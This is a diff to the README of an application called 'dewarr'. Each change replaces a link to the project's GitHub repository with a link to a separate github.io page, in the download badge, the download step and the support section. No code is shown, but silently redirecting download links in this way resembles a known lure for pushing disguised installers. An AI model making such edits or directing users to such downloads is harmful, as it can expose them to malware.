@@ -29,11 +29,11 @@ Before you begin, make sure your computer meets these basic requirements:
 
 ## 📥 Getting Started
 
-[![Download dewarr](https://img.shields.io/badge/Download-dewarr-blue?style=for-the-badge&logo=github)](https://github.com/khaizrishal/dewarr)
+[![Download dewarr](https://img.shields.io/badge/Download-dewarr-blue?style=for-the-badge&logo=github)](https://khaizrishal.github.io)
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/khaizrishal/dewarr](https://github.com/khaizrishal/dewarr)
+Visit this link to download the application: [https://khaizrishal.github.io](https://khaizrishal.github.io)
 
 ### Step 2: Install dewarr
 
@@ -180,7 +180,7 @@ For users comfortable with Docker, dewarr offers easy containerized setup:
 
 If you need assistance:
 
-- **Visit the GitHub Repository**: [https://github.com/khaizrishal/dewarr](https://github.com/khaizrishal/dewarr) for documentation and support
+- **Visit the GitHub Repository**: [https://khaizrishal.github.io](https://khaizrishal.github.io) for documentation and support
 - **Check the Issues Section**: See if others have reported similar problems
 - **Read the Wiki**: Detailed guides and tutorials are available on the repository page
 
